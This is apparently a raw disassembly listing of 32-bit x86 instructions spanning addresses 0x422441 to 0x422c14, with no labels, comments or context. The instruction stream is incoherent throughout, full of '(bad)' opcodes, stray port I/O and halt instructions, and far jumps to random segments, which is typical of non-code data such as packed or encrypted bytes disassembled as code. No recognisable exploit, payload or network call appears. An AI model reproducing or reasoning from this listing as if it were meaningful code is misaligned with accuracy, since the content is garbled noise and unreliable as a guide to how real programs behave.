  422441:	test   al,0x8b
  422443:	dec    esi
  422444:	mov    cl,0xe6
  422446:	pop    esp
  422447:	mov    al,0x20
  422449:	out    0xdb,eax
  42244b:	int3   
  42244c:	mov    esi,0xb5804748
  422451:	shl    cl,cl
  422453:	add    DWORD PTR [eax],esp
  422455:	mov    edx,0xa848e556
  42245a:	lea    esp,[ecx+0x244fb9fd]
  422460:	fldcw  WORD PTR [eax]
  422462:	inc    esi
  422463:	bound  ecx,QWORD PTR [esi]
  422465:	pop    ecx
  422466:	div    al
  422468:	mov    edi,0x1413ab31
  42246d:	mov    dh,0x14
  42246f:	mov    edi,DWORD PTR [edx]
  422471:	hlt    
  422472:	jbe    0x422449
  422474:	inc    DWORD PTR ds:0x29a3e77a
  42247a:	or     al,BYTE PTR [ebx+0x1d]
  42247d:	sbb    DWORD PTR [ecx+0x2d79c39c],esi
  422483:	shr    BYTE PTR [bp-0x496b],1
  422488:	cli    
  422489:	xchg   ebp,eax
  42248a:	sub    cl,bh
  42248c:	inc    esp
  42248d:	fldenv [ecx+ecx*1+0x3c55d39d]
  422494:	ja     0x42250c
  422496:	cli    
  422497:	jl     0x4224e3
  422499:	jmp    0x42249f
  42249b:	mov    DWORD PTR [ecx*2+0x6be8bf02],edi
  4224a2:	mov    ecx,DWORD PTR [ecx]
  4224a4:	ins    BYTE PTR es:[edi],dx
  4224a5:	xor    BYTE PTR [edi-0x7666afa4],0x5a
  4224ac:	pop    ebx
  4224ad:	pop    ds
  4224ae:	adc    ah,BYTE PTR [ecx-0x507bc108]
  4224b4:	add    al,BYTE PTR [ebx+0x11]
  4224b7:	loop   0x422518
  4224b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224ba:	pop    eax
  4224bb:	fld    QWORD PTR [ebp-0x7b]
  4224be:	push   esi
  4224bf:	xor    ch,BYTE PTR [edi+ebx*1-0x13]
  4224c3:	mov    edx,0x8609c0d7
  4224c8:	mov    BYTE PTR [edx],cl
  4224ca:	bound  eax,QWORD PTR [edx]
  4224cc:	addr16 jle 0xac5b78d2
  4224d3:	and    dl,BYTE PTR [ecx]
  4224d5:	fild   QWORD PTR cs:[ecx+0x40]
  4224d9:	ds mov bl,0x56
  4224dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224dd:	jecxz  0x42255d
  4224df:	ja     0x4224af
  4224e1:	xchg   esp,eax
  4224e2:	(bad)  
  4224e3:	fisubr DWORD PTR [edx-0x41]
  4224e6:	jl     0x4224ff
  4224e8:	inc    ebx
  4224e9:	fwait
  4224ea:	cmp    DWORD PTR [ecx-0x77a8f7fa],edi
  4224f0:	mov    ds:0x710cf3ce,eax
  4224f5:	sub    eax,0x9d00fe67
  4224fa:	pop    esp
  4224fb:	add    bh,BYTE PTR [edx+0x6661fcab]
  422501:	out    dx,al
  422502:	leave  
  422503:	cmc    
  422504:	(bad)  [edx-0x2c]
  422507:	sub    al,0xf8
  422509:	cld    
  42250a:	sar    ebx,1
  42250c:	lods   eax,DWORD PTR ds:[esi]
  42250d:	fild   QWORD PTR [esi+0x37bf63cc]
  422513:	inc    esp
  422514:	retf   0xa2e0
  422517:	in     al,dx
  422518:	mov    al,0xd7
  42251a:	xor    BYTE PTR ds:0x51e52b,0xd8
  422521:	dec    DWORD PTR [esp+ecx*2]
  422524:	in     eax,dx
  422525:	mov    ah,0xa4
  422527:	sbb    eax,0xe2eab48c
  42252c:	jmp    0x422596
  42252e:	pop    ecx
  42252f:	mov    ds:0x2862bac0,al
  422534:	xchg   ebx,eax
  422535:	pop    ecx
  422536:	mov    cs,WORD PTR [ecx-0x51be37a9]
  42253c:	mov    eax,ds:0xde048891
  422541:	mov    al,ds:0xa0390b89
  422546:	dec    esp
  422547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422548:	adc    esi,DWORD PTR [edi+0x546aba0c]
  42254e:	std    
  42254f:	mov    BYTE PTR [ecx+0x7ab58fed],bl
  422555:	mov    al,0x98
  422557:	hlt    
  422558:	jae    0x42251e
  42255a:	xchg   ebx,eax
  42255b:	loopne 0x422547
  42255d:	add    al,0xd9
  42255f:	mov    ebx,0x13291e55
  422564:	jo     0x422580
  422566:	scas   eax,DWORD PTR es:[edi]
  422567:	shr    edx,cl
  422569:	add    DWORD PTR [edx+0x57],0x1b52caf9
  422570:	sbb    ecx,DWORD PTR [edi+0x39]
  422573:	fld    st(6)
  422575:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422576:	popa   
  422577:	cmp    dh,BYTE PTR [eax]
  422579:	xchg   edi,esi
  42257b:	and    DWORD PTR [esi-0x6c],edi
  42257e:	xor    eax,0xa7140c30
  422583:	mov    dh,0xc6
  422585:	mov    esp,0xdd82d6f7
  42258a:	mov    bh,0xfe
  42258c:	sbb    eax,0x9a49e261
  422591:	xor    edi,esp
  422593:	or     al,0xed
  422595:	mov    ecx,0x316d3731
  42259a:	add    BYTE PTR [eax+ecx*1],cl
  42259d:	icebp  
  42259e:	lods   al,BYTE PTR ds:[esi]
  42259f:	push   ss
  4225a0:	fsub   st(3),st
  4225a2:	xchg   ebx,eax
  4225a3:	xor    eax,0xa3eca522
  4225a8:	sbb    eax,0x4b04a69
  4225ad:	pop    ebx
  4225ae:	setge  BYTE PTR [edx+edx*1]
  4225b2:	test   al,0x6a
  4225b4:	push   eax
  4225b5:	cmp    BYTE PTR [edi-0x3],0x25
  4225b9:	faddp  st(2),st
  4225bb:	imul   ecx,DWORD PTR [esi],0xffffff89
  4225be:	xor    eax,0x7fff7a48
  4225c3:	aaa    
  4225c4:	retf   
  4225c5:	mov    ah,dh
  4225c7:	mov    eax,ds:0x19254467
  4225cc:	xor    al,0x15
  4225ce:	fdiv   DWORD PTR [ebx-0x29]
  4225d1:	int    0x4c
  4225d3:	adc    al,0xbc
  4225d5:	stos   DWORD PTR es:[edi],eax
  4225d6:	and    ecx,ebp
  4225d8:	pushf  
  4225d9:	pop    eax
  4225da:	mov    eax,ds:0xe8d869ff
  4225df:	enter  0xae20,0x21
  4225e3:	adc    ecx,esp
  4225e5:	mov    edi,0xf57fecb7
  4225ea:	xor    dl,BYTE PTR [ecx-0x7]
  4225ed:	jg     0x422652
  4225ef:	fs pushf 
  4225f1:	cld    
  4225f2:	or     ch,BYTE PTR [ebx-0x28c00c39]
  4225f8:	ss pushf 
  4225fa:	lds    esi,FWORD PTR [esi]
  4225fc:	adc    dh,BYTE PTR [ecx]
  4225fe:	lods   al,BYTE PTR ds:[esi]
  4225ff:	xor    dl,BYTE PTR [edi+ecx*4]
  422602:	(bad)  
  422603:	xlat   BYTE PTR ds:[ebx]
  422604:	adc    DWORD PTR ds:[ecx-0x46c8925],0x2d
  42260c:	enter  0x609b,0x4c
  422610:	jge    0x422607
  422612:	call   0x2613176b
  422617:	cmc    
  422618:	pop    esi
  422619:	mov    al,ds:0xe91c83ca
  42261e:	aaa    
  42261f:	ja     0x42267d
  422621:	jo     0x4225bb
  422623:	and    DWORD PTR [edx+0x44f97d4c],ecx
  422629:	push   0x5b
  42262b:	pop    ebp
  42262c:	repnz cs mov edi,0xaf41bde1
  422633:	or     DWORD PTR [edi],0xffc958b2
  422639:	pop    ebx
  42263a:	xor    DWORD PTR [eax+0x17ac5c82],ebx
  422640:	dec    edx
  422641:	dec    edx
  422642:	(bad)  
  422643:	in     al,0x40
  422645:	mov    gs,WORD PTR [ebx+ebx*4+0x3b]
  422649:	mov    BYTE PTR [esi],ch
  42264b:	xor    al,ch
  42264d:	mov    ds:0x221739d8,eax
  422652:	sub    al,0x9
  422654:	adc    bh,BYTE PTR [ebx]
  422656:	push   ecx
  422657:	mov    ds:0x7fc62644,eax
  42265c:	pop    edx
  42265d:	cld    
  42265e:	and    BYTE PTR [edi-0x55],bl
  422661:	xor    edi,DWORD PTR [ebx]
  422663:	or     DWORD PTR [ecx],esi
  422665:	retf   
  422666:	stos   DWORD PTR es:[edi],eax
  422667:	hlt    
  422668:	sub    BYTE PTR [ebx+ebp*8],ch
  42266b:	shr    al,0xaf
  42266e:	mov    ebp,0xeb87515d
  422673:	sbb    eax,0xae91b0ab
  422678:	xchg   esp,eax
  422679:	mov    al,0x48
  42267b:	and    DWORD PTR [edi],ebx
  42267d:	jmp    0x422699
  42267f:	xor    ebx,DWORD PTR [ecx+0x4e017bc3]
  422685:	cdq    
  422686:	add    cl,BYTE PTR [ebp-0x2ca08a93]
  42268c:	aas    
  42268d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42268e:	in     al,dx
  42268f:	push   esp
  422690:	aaa    
  422691:	push   ds
  422692:	in     al,0x1c
  422694:	(bad)  
  422695:	cwde   
  422696:	or     al,0x48
  422698:	dec    ebp
  422699:	mov    dh,0x47
  42269b:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42269d:	inc    esp
  42269e:	xchg   esp,ebx
  4226a0:	mov    al,ds:0x80f454ae
  4226a5:	aam    0x11
  4226a7:	sbb    ebx,0xffffffb9
  4226aa:	test   BYTE PTR [edi],dl
  4226ac:	and    BYTE PTR [edi+0x7e0e1deb],al
  4226b2:	xchg   edx,eax
  4226b3:	jl     0x422699
  4226b5:	xchg   BYTE PTR [edi],ch
  4226b7:	push   ebp
  4226b8:	xchg   ebp,eax
  4226b9:	push   es
  4226ba:	scas   eax,DWORD PTR es:[edi]
  4226bb:	in     eax,0x89
  4226bd:	arpl   WORD PTR [esi],dx
  4226bf:	addr16 jle 0x422732
  4226c2:	(bad)  
  4226c4:	add    DWORD PTR [ecx],esi
  4226c6:	daa    
  4226c7:	movzx  ebx,BYTE PTR ds:0xf7902269
  4226ce:	cs jmp 0x2333:0xaa5cc30d
  4226d6:	sub    ebp,DWORD PTR [ecx+0x27]
  4226d9:	mov    eax,ds:0x68b7850d
  4226de:	repz jb 0x422683
  4226e1:	jns    0x422734
  4226e3:	mov    esi,0xd40c9d4
  4226e8:	mov    al,0x73
  4226ea:	ss fwait
  4226ec:	sub    dl,0x71
  4226ef:	mov    bl,0xbf
  4226f1:	adc    BYTE PTR [ebp+0x7d],0x8b
  4226f5:	mov    eax,ds:0x8fd2b5ab
  4226fa:	aas    
  4226fb:	(bad)  
  4226fc:	out    dx,eax
  4226fd:	sub    BYTE PTR [edi+0x12],bh
  422700:	push   eax
  422701:	lea    esi,[eax+0x7a810234]
  422707:	mov    cl,0x63
  422709:	das    
  42270a:	cmp    BYTE PTR [ecx],ah
  42270c:	and    al,0x26
  42270e:	cwde   
  42270f:	aaa    
  422710:	aam    0xda
  422712:	mov    es,esp
  422714:	and    ah,BYTE PTR ds:0x73ca3bea
  42271a:	shl    BYTE PTR [edx],cl
  42271c:	pop    edi
  42271d:	repnz sbb ecx,0xffffffe8
  422721:	lods   al,BYTE PTR ds:[esi]
  422722:	pmaxub mm2,QWORD PTR [eax]
  422725:	fidiv  WORD PTR [ecx+0x5ca75050]
  42272b:	jl     0x4226b4
  42272d:	cmc    
  42272e:	gs pop edi
  422730:	mov    bh,0x2c
  422732:	jo     0x42277d
  422734:	cld    
  422735:	push   ebx
  422736:	enter  0x739d,0xe8
  42273a:	not    dh
  42273c:	mov    WORD PTR [esi-0x13fcabaa],ss
  422742:	push   ecx
  422743:	dec    esp
  422744:	pop    ss
  422745:	xor    BYTE PTR [ecx],0xd1
  422748:	push   ebp
  422749:	mov    eax,cs
  42274b:	rol    edi,1
  42274d:	iret   
  42274e:	in     al,0xdf
  422750:	sub    ebp,DWORD PTR [ecx]
  422752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422753:	aaa    
  422754:	aad    0xa
  422756:	gs sbb al,0xc5
  422759:	sar    DWORD PTR [edx+0xd],0xee
  42275d:	imul   DWORD PTR [edx+0x2e40e83e]
  422763:	hlt    
  422764:	sub    al,0x51
  422766:	dec    ebx
  422767:	retf   0xd60e
  42276a:	sub    dh,BYTE PTR [ebx]
  42276c:	in     al,dx
  42276d:	stos   DWORD PTR es:[edi],eax
  42276e:	inc    esp
  42276f:	ficomp WORD PTR [edx]
  422771:	mov    cl,0xa9
  422773:	adc    edx,DWORD PTR [ebx]
  422775:	sub    bl,BYTE PTR [eax-0x3a20801]
  42277b:	cmp    al,0x1
  42277d:	push   ds
  42277e:	add    al,0xad
  422780:	outs   dx,DWORD PTR ds:[esi]
  422781:	adc    DWORD PTR cs:[edi+edx*1+0x18],0x935c1094
  42278a:	(bad)  
  42278b:	and    eax,edi
  42278d:	sbb    dh,dh
  42278f:	clc    
  422790:	mov    esp,0xd3471406
  422795:	lahf   
  422796:	fdivr  DWORD PTR [edi]
  422798:	icebp  
  422799:	and    al,0x39
  42279b:	lods   al,BYTE PTR ds:[esi]
  42279c:	pushf  
  42279d:	popa   
  42279e:	push   es
  42279f:	inc    esi
  4227a0:	jg     0x422813
  4227a2:	xlat   BYTE PTR ds:[ebx]
  4227a3:	and    eax,0x149aee50
  4227a8:	and    dl,ah
  4227aa:	jnp    0x42277f
  4227ac:	call   FWORD PTR [esi+ebp*8+0x7c]
  4227b0:	xchg   esi,eax
  4227b1:	ret    0xbd46
  4227b4:	push   edi
  4227b5:	cmc    
  4227b6:	xor    BYTE PTR [eax+ebx*1-0x10],bh
  4227ba:	es nop
  4227bc:	inc    ecx
  4227bd:	cmp    ebx,DWORD PTR [eax+0x1d15d764]
  4227c3:	dec    ebx
  4227c4:	mov    dh,0x76
  4227c6:	jb     0x4227bb
  4227c8:	xor    ecx,ecx
  4227ca:	lods   al,BYTE PTR ds:[esi]
  4227cb:	sub    bl,BYTE PTR [edi]
  4227cd:	mov    cl,0xb5
  4227cf:	(bad)  
  4227d0:	mov    edi,0xc050882c
  4227d5:	add    dh,ah
  4227d7:	inc    ebp
  4227d8:	sbb    BYTE PTR [ebx],dl
  4227da:	mov    cs:0x6db3b4bf,eax
  4227e0:	sub    ebp,DWORD PTR [esi]
  4227e2:	jmp    0xc076fa27
  4227e7:	hlt    
  4227e8:	ret    0xca2b
  4227eb:	dec    eax
  4227ec:	mov    esp,0xa19ccff6
  4227f1:	nop
  4227f2:	aaa    
  4227f3:	push   edx
  4227f4:	shr    DWORD PTR [edi+0x54],cl
  4227f7:	scas   eax,DWORD PTR es:[edi]
  4227f8:	mov    eax,0x4f7312fc
  4227fd:	push   0x7c
  4227ff:	sbb    al,0xcc
  422801:	or     bh,BYTE PTR [ecx]
  422803:	xchg   esi,eax
  422804:	jmp    0xd2016994
  422809:	sbb    ecx,eax
  42280b:	stos   DWORD PTR es:[edi],eax
  42280c:	aad    0x4c
  42280e:	cwde   
  42280f:	add    edx,edx
  422811:	dec    esi
  422812:	xor    ch,ch
  422814:	jmp    0xa5ddbdc4
  422819:	fadd   st(2),st
  42281b:	and    BYTE PTR [edx-0xe1d2b0b],bl
  422821:	mov    WORD PTR fs:[ebx],es
  422824:	lock cmp ecx,esi
  422827:	hlt    
  422828:	jo     0x4227aa
  42282a:	xor    DWORD PTR [ecx+0x6d],edx
  42282d:	test   DWORD PTR [esi],0x373c3c99
  422833:	adc    BYTE PTR [eax-0x7a],ah
  422836:	rol    BYTE PTR [ebp+0x3d],0x87
  42283a:	fisttp QWORD PTR es:[eax-0x1e]
  42283e:	jae    0x4228b3
  422840:	sar    BYTE PTR [edi],1
  422842:	or     al,0xcd
  422844:	mov    al,0xd2
  422846:	std    
  422847:	addr16 push es
  422849:	enter  0xc18d,0xa
  42284d:	aam    0x19
  42284f:	clc    
  422850:	cli    
  422851:	jnp    0x422867
  422853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422854:	sub    DWORD PTR [ecx],0xb8414de4
  42285a:	mov    edx,0xafc521cf
  42285f:	mov    ebp,0x4a8acbcb
  422864:	call   0x4201:0x3c6b9119
  42286b:	fdivr  DWORD PTR [eax+0x12743324]
  422871:	pop    edi
  422872:	push   es
  422873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422874:	loopne 0x4227f7
  422876:	pop    edi
  422877:	dec    esi
  422878:	cld    
  422879:	jmp    0x8319:0x102a6eb7
  422880:	inc    edi
  422881:	das    
  422882:	dec    eax
  422883:	fwait
  422884:	xchg   esi,eax
  422885:	hlt    
  422886:	cdq    
  422887:	aaa    
  422888:	out    dx,eax
  422889:	imul   eax,ebx,0xffffffb3
  42288c:	push   ebx
  42288d:	xchg   esp,eax
  42288e:	mov    ah,0x9a
  422890:	mov    esp,0x3561e7e0
  422895:	add    bh,bh
  422897:	sub    BYTE PTR [ebx-0x446da1b9],dh
  42289d:	ins    DWORD PTR es:[edi],dx
  42289e:	inc    edx
  42289f:	jmp    0xed995aae
  4228a4:	dec    edx
  4228a5:	adc    BYTE PTR [esi-0xa],dl
  4228a8:	or     al,0x21
  4228aa:	sbb    al,0xe6
  4228ac:	sub    BYTE PTR [edx+0x3e6f8cc5],0xe2
  4228b3:	adc    DWORD PTR [ebx-0x21],0x4
  4228b7:	cli    
  4228b8:	popf   
  4228b9:	sub    al,BYTE PTR [esi+0x3a]
  4228bc:	and    DWORD PTR [esi],esp
  4228be:	out    0x39,al
  4228c0:	stc    
  4228c1:	test   eax,0x9d6a0b22
  4228c6:	dec    eax
  4228c7:	shr    DWORD PTR [edi+0x2e],0x1b
  4228cb:	je     0x42288a
  4228cd:	daa    
  4228ce:	das    
  4228cf:	sbb    eax,0x20917a75
  4228d4:	pop    es
  4228d5:	jo     0x422887
  4228d7:	dec    esi
  4228d8:	(bad)  
  4228d9:	sar    BYTE PTR [ecx+0x78],1
  4228dc:	pushf  
  4228dd:	mov    dl,0x96
  4228df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4228e0:	sub    BYTE PTR [ecx-0x4d72ecb2],ah
  4228e6:	mov    edx,0xacacf80e
  4228eb:	push   es
  4228ec:	or     eax,0x77e6fe92
  4228f1:	nop
  4228f2:	mov    ecx,0x20ce93c7
  4228f7:	mov    ch,0x68
  4228f9:	add    ch,BYTE PTR [edi]
  4228fb:	mov    edi,0xbab2d52d
  422900:	push   edi
  422901:	mov    dl,0xe3
  422903:	stc    
  422904:	inc    ebp
  422905:	rcl    DWORD PTR [esi],0x91
  422908:	jl     0x42295e
  42290a:	(bad)  
  42290b:	ficomp DWORD PTR [ecx+0x1f]
  42290e:	pop    esi
  42290f:	jne    0x422919
  422911:	mov    al,0xc9
  422913:	aaa    
  422914:	test   BYTE PTR [ebx+0x78f296b7],cl
  42291a:	adc    edx,0x1bad1b71
  422920:	fcom   QWORD PTR [eax+0x1dfde1d]
  422926:	lahf   
  422927:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422928:	dec    ebx
  422929:	mov    bl,0xd5
  42292b:	pop    ebx
  42292c:	xchg   edx,eax
  42292d:	int    0x31
  42292f:	pop    ecx
  422930:	mov    cl,0x3
  422932:	ins    BYTE PTR es:[edi],dx
  422933:	mov    ah,0xc5
  422935:	xor    DWORD PTR [eax],ecx
  422937:	mov    bl,0x4f
  422939:	adc    DWORD PTR [ecx],0xffffffb1
  42293c:	jp     0x42298f
  42293e:	loop   0x422966
  422940:	cmc    
  422941:	jne    0x422993
  422943:	push   ebp
  422944:	std    
  422945:	sbb    DWORD PTR [ecx-0x791a6f2c],ebp
  42294b:	and    eax,0x7b08dc95
  422950:	or     al,0x75
  422952:	add    BYTE PTR [ebp-0x3d],dl
  422955:	cmp    dl,ah
  422957:	(bad)  
  422958:	loopne 0x422935
  42295a:	jmp    0xe624f2ce
  42295f:	sbb    eax,DWORD PTR [ecx-0x35f8a48c]
  422965:	xor    ah,BYTE PTR [eax-0x3e5b711a]
  42296b:	test   BYTE PTR [edi],dh
  42296d:	sub    esi,0x18c72ea8
  422973:	daa    
  422974:	jnp    0x42298f
  422976:	imul   edx,ecx,0x3b
  422979:	sbb    ch,BYTE PTR [esi]
  42297b:	sti    
  42297c:	(bad)  [eax]
  42297e:	fimul  DWORD PTR [edi+0x4e103584]
  422984:	mov    cl,0xf
  422986:	aam    0x2d
  422988:	mov    ds:0xb45555ba,al
  42298d:	hlt    
  42298e:	jae    0x4229e2
  422990:	sbb    BYTE PTR [eax+edi*8-0x4b],0x7b
  422995:	mov    esp,0xfce24e69
  42299a:	stos   DWORD PTR es:[edi],eax
  42299b:	inc    eax
  42299c:	outs   dx,BYTE PTR ds:[esi]
  42299d:	sbb    eax,0x56ec2277
  4229a2:	int3   
  4229a3:	lods   al,BYTE PTR ds:[esi]
  4229a4:	outs   dx,DWORD PTR ds:[esi]
  4229a5:	imul   ebp,DWORD PTR [eax],0x67d33f50
  4229ab:	jno    0x422941
  4229ad:	sub    eax,0x48101e38
  4229b2:	fwait
  4229b3:	repnz xchg edx,eax
  4229b5:	int3   
  4229b6:	jmp    0x5679:0xebb991e3
  4229bd:	fldcw  WORD PTR [edi-0x5d]
  4229c0:	emms   
  4229c2:	add    DWORD PTR [esp+ebx*2-0x2815f6c4],esi
  4229c9:	jns    0x422a49
  4229cb:	outs   dx,DWORD PTR ds:[esi]
  4229cc:	pop    ebp
  4229cd:	mov    ch,0x75
  4229cf:	jmp    0xb79c002e
  4229d4:	jl     0x422a41
  4229d6:	and    DWORD PTR [edi],eax
  4229d8:	xor    eax,0x73c476aa
  4229dd:	pop    esp
  4229de:	dec    eax
  4229df:	gs dec ebx
  4229e1:	out    dx,eax
  4229e2:	(bad)  
  4229e3:	out    dx,eax
  4229e4:	pusha  
  4229e5:	test   eax,0x5175c94b
  4229ea:	add    ebx,DWORD PTR [edi]
  4229ec:	leave  
  4229ed:	pop    ds
  4229ee:	lods   eax,DWORD PTR ds:[esi]
  4229ef:	mov    cl,0xc1
  4229f1:	jmp    0x4b4d:0xab654035
  4229f8:	mov    al,ds:0xc0d1cbcb
  4229fd:	jmp    0x4229b1
  4229ff:	enter  0x88cf,0xc5
  422a03:	mov    al,ds:0xc8c696a7
  422a08:	cli    
  422a09:	mov    ebx,0xc9546ada
  422a0e:	inc    BYTE PTR [esi]
  422a10:	inc    esi
  422a11:	icebp  
  422a12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a13:	cld    
  422a14:	xchg   esp,eax
  422a15:	int    0xf0
  422a17:	cld    
  422a18:	or     ebp,DWORD PTR [edx+0x40]
  422a1b:	sbb    cl,ah
  422a1d:	and    dl,al
  422a1f:	jno    0x422a3a
  422a21:	pusha  
  422a22:	mov    WORD PTR [ecx+0x5bc0077e],ss
  422a28:	je     0x4229de
  422a2a:	in     al,0xaa
  422a2c:	xchg   ebx,eax
  422a2d:	into   
  422a2e:	inc    esp
  422a2f:	out    dx,al
  422a30:	imul   ecx,esi,0x795f9a9e
  422a36:	(bad)  
  422a37:	out    dx,eax
  422a38:	lds    esp,FWORD PTR [ebp+0x12e0b513]
  422a3e:	inc    eax
  422a3f:	not    BYTE PTR [ecx+esi*8]
  422a42:	jnp    0x4229f1
  422a44:	xchg   esi,eax
  422a45:	adc    eax,0xdf111f04
  422a4a:	test   BYTE PTR [edx],al
  422a4c:	xchg   edi,eax
  422a4d:	sahf   
  422a4e:	xor    eax,0xd6117c7a
  422a53:	or     DWORD PTR ds:0x70f96fb5,ebp
  422a59:	push   esi
  422a5a:	jmp    0xed89:0x8507c1d5
  422a61:	mov    esi,esp
  422a63:	dec    edx
  422a64:	repz enter 0x192e,0xf7
  422a69:	out    0x80,al
  422a6b:	cmp    BYTE PTR [eax-0x39],al
  422a6e:	mov    bh,BYTE PTR [ebx+0x59b06c9e]
  422a74:	aas    
  422a75:	test   eax,0x5b4db8
  422a7a:	inc    esi
  422a7b:	mov    bh,0xff
  422a7d:	(bad)  [edi-0x6dd54ee3]
  422a83:	push   ecx
  422a84:	and    BYTE PTR [edx-0xd],ah
  422a87:	cdq    
  422a88:	nop
  422a89:	inc    ecx
  422a8a:	js     0x422a38
  422a8c:	adc    BYTE PTR [ebx-0x2a],dl
  422a8f:	loop   0x422af1
  422a91:	xor    ch,BYTE PTR [edi]
  422a93:	pop    esi
  422a94:	sub    cl,al
  422a96:	out    dx,eax
  422a97:	outs   dx,BYTE PTR ds:[esi]
  422a98:	xchg   edx,eax
  422a99:	(bad)  
  422a9a:	ds cmp al,0x22
  422a9d:	pop    ss
  422a9e:	(bad)  
  422a9f:	push   ss
  422aa0:	sbb    DWORD PTR [ecx+eax*8+0xfcc421],0x1a72a616
  422aab:	sub    al,0x26
  422aad:	dec    ebx
  422aae:	or     dl,dl
  422ab0:	mov    al,ds:0x70ed3ed2
  422ab5:	dec    eax
  422ab6:	xchg   ebx,eax
  422ab7:	mov    dl,0x6a
  422ab9:	jo     0x422af3
  422abb:	bound  esp,QWORD PTR [ebx+0x1747384f]
  422ac1:	push   esi
  422ac2:	test   eax,0x83232119
  422ac7:	lods   al,BYTE PTR gs:[esi]
  422ac9:	scas   eax,DWORD PTR es:[edi]
  422aca:	repz mov edx,0xa72a2eef
  422ad0:	ds scas al,BYTE PTR es:[edi]
  422ad2:	repz les edi,FWORD PTR [eax]
  422ad5:	jecxz  0x422a82
  422ad7:	mov    eax,0xf4e02141
  422adc:	adc    BYTE PTR [ebp-0x615c9655],ch
  422ae2:	and    ecx,ecx
  422ae4:	gs cwde 
  422ae6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ae7:	sub    DWORD PTR [eax],ebx
  422ae9:	mov    ecx,0x4a7b0105
  422aee:	and    al,0xb4
  422af0:	or     BYTE PTR ds:0xc3f677b9,dl
  422af6:	sub    eax,0xfaa50e79
  422afb:	mov    ah,0x7c
  422afd:	add    al,0x71
  422aff:	(bad)  
  422b00:	clc    
  422b01:	js     0x422b1d
  422b03:	push   edx
  422b04:	jnp    0x422aac
  422b06:	in     eax,dx
  422b07:	mov    edx,0x12646f89
  422b0c:	mov    bh,0x2
  422b0e:	jl     0x422acb
  422b10:	psubb  mm1,mm5
  422b13:	fimul  DWORD PTR [ebp-0x6ff8cb84]
  422b19:	into   
  422b1a:	xor    DWORD PTR [bp+di],esi
  422b1d:	mov    bh,0xc7
  422b1f:	mov    ds:0x4398aa53,eax
  422b24:	and    ecx,0xc80396b4
  422b2a:	jne    0x422ac2
  422b2c:	cmc    
  422b2d:	lock sub BYTE PTR [eax],ch
  422b30:	stc    
  422b31:	ret    
  422b32:	dec    edi
  422b33:	fisub  DWORD PTR [ebp-0x4b15105a]
  422b39:	xchg   edi,eax
  422b3a:	mov    cl,0xaf
  422b3c:	and    dh,0x47
  422b3f:	jnp    0x422bb3
  422b41:	repz retf 0xf8b
  422b45:	adc    ebp,DWORD PTR [eax+0x3]
  422b48:	sbb    BYTE PTR [eax+0x186c88d3],bl
  422b4e:	jb     0x422b15
  422b50:	scas   al,BYTE PTR es:[edi]
  422b51:	xor    eax,0xb29dc141
  422b56:	push   0x1802f340
  422b5b:	cld    
  422b5c:	(bad)  
  422b5d:	xchg   edi,eax
  422b5e:	shl    DWORD PTR [eax],0x5a
  422b61:	stc    
  422b62:	sbb    al,0x6e
  422b64:	dec    eax
  422b65:	fstp   TBYTE PTR [eax+0x25]
  422b68:	popf   
  422b69:	push   esp
  422b6a:	add    dl,bl
  422b6c:	iret   
  422b6d:	push   edi
  422b6e:	ins    DWORD PTR es:[edi],dx
  422b6f:	in     al,dx
  422b70:	mov    ds:0xd0795226,eax
  422b75:	inc    ebp
  422b76:	lea    esp,[edx]
  422b78:	dec    ebx
  422b79:	adc    esi,DWORD PTR [edx+edi*8]
  422b7c:	mov    ebp,esp
  422b7e:	out    dx,al
  422b7f:	(bad)  
  422b80:	cmp    BYTE PTR [edi],ah
  422b82:	dec    eax
  422b83:	fs hlt 
  422b85:	aaa    
  422b86:	mov    ecx,0x7f505dcd
  422b8b:	sub    BYTE PTR [ecx],dh
  422b8d:	or     eax,DWORD PTR [ecx-0x66e449cf]
  422b93:	jg     0x422bd7
  422b95:	adc    BYTE PTR [ebx-0x2a],ah
  422b98:	pop    edi
  422b99:	retf   
  422b9a:	aam    0x72
  422b9c:	lods   al,BYTE PTR ds:[esi]
  422b9d:	pop    ecx
  422b9e:	ins    DWORD PTR es:[edi],dx
  422b9f:	sbb    bh,bl
  422ba1:	out    dx,al
  422ba2:	int3   
  422ba3:	fwait
  422ba4:	sub    esi,ecx
  422ba6:	std    
  422ba7:	in     eax,dx
  422ba8:	js     0x422b5a
  422baa:	fs or  cl,ch
  422bad:	lahf   
  422bae:	pop    esp
  422baf:	jecxz  0x422b75
  422bb1:	mov    BYTE PTR cs:[ecx-0x5d],ch
  422bb5:	repnz xor edi,ecx
  422bb8:	mov    edi,0xfb46d4a0
  422bbd:	sub    BYTE PTR [ebp+esi*1+0x7c],ah
  422bc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bc2:	mov    eax,ds:0xd5dd89b8
  422bc7:	add    esi,0x6eb6cb20
  422bcd:	aad    0x6b
  422bcf:	push   ebx
  422bd0:	cmp    dh,ah
  422bd2:	repz sub cl,BYTE PTR [ecx+0x9c440c]
  422bd9:	and    BYTE PTR [ebp+0x69],0xca
  422bdd:	and    eax,0x91cf4d28
  422be2:	adc    DWORD PTR [edx-0x55],ebp
  422be5:	(bad)  
  422be6:	mov    ebx,0x20651616
  422beb:	enter  0x82f3,0x6a
  422bef:	data16 sbb dh,BYTE PTR [ebx]
  422bf2:	hlt    
  422bf3:	push   es
  422bf4:	mov    ecx,0x11f9caed
  422bf9:	jg     0x422b7f
  422bfb:	push   ebp
  422bfc:	lea    ecx,[ecx+edx*4+0x21]
  422c00:	jne    0x422be3
  422c02:	pop    ss
  422c03:	daa    
  422c04:	fistp  WORD PTR [esi]
  422c06:	jb     0x422c65
  422c08:	shl    BYTE PTR [edi-0x35cf94e],1
  422c0e:	cmp    edx,DWORD PTR [ecx]
  422c10:	jae    0x422b94
  422c12:	adc    ebx,edi
  422c14:	dec    esi
